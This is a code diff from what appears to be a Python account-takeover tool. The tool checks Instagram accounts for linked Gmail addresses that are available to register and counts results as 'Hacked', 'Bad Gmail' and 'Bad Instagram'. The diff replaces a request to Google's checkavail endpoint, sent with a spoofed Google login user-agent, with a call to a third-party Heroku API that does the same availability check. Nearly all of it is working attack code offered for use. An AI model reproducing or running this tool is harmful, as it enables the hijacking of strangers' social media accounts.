@@ -52,20 +52,10 @@ def gmail1():
                 os.system('cls'if os.name=='nt'else'clear')
                 print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
             elif ('"bad_password"') in re:
-                url = 'https://android.clients.google.com/setup/checkavail'
-                headers = {
-                    'Content-Length':'98',
-                    'Content-Type':'text/plain; charset=UTF-8',
-                    'Host':'android.clients.google.com',
-                    'Connection':'Keep-Alive',
-                    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
-                data= json.dumps({
-                    'username':f'{email}@gmail.com',
-                    'version':'3',
-                    'firstName':'AbaLahb',
-                    'lastName':'AbuJahl'})
+                url = requests.get(f'https://api-gmail-97f03023f7dd.herokuapp.com/api/gmail/v1/v.1/{email}')
+             
                 try:
-                    res=requests.post(url,headers=headers,data=data)
+                    res=url
                 except requests.exceptions.ConnectionError as error:
                     continue
                 
@@ -75,7 +65,7 @@ def gmail1():
                        
            
 
-                if res.json()['status'] == 'SUCCESS':
+                if url.json()[0]['status'] == 'Ok':
 
 
                     nn = email
@@ -238,19 +228,9 @@ def gmail():
                 time.sleep(5)
             elif ('"user":true,') in rf:
                 url = requests.get(f'https://api-gmail-97f03023f7dd.herokuapp.com/api/gmail/v1/v.1/{email}')
-                headers = {
-                    'Content-Length':'98',
-                    'Content-Type':'text/plain; charset=UTF-8',
-                    'Host':'android.clients.google.com',
-                    'Connection':'Keep-Alive',
-                    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
-                data= json.dumps({
-                    'username':f'{email}@gmail.com',
-                    'version':'3',
-                    'firstName':'AbaLahb',
-                    'lastName':'AbuJahl'})
+             
                 try:
-                    res=requests.post(url,headers=headers,data=data)
+                    res=url
                 except requests.exceptions.ConnectionError as error:
                     continue
                 
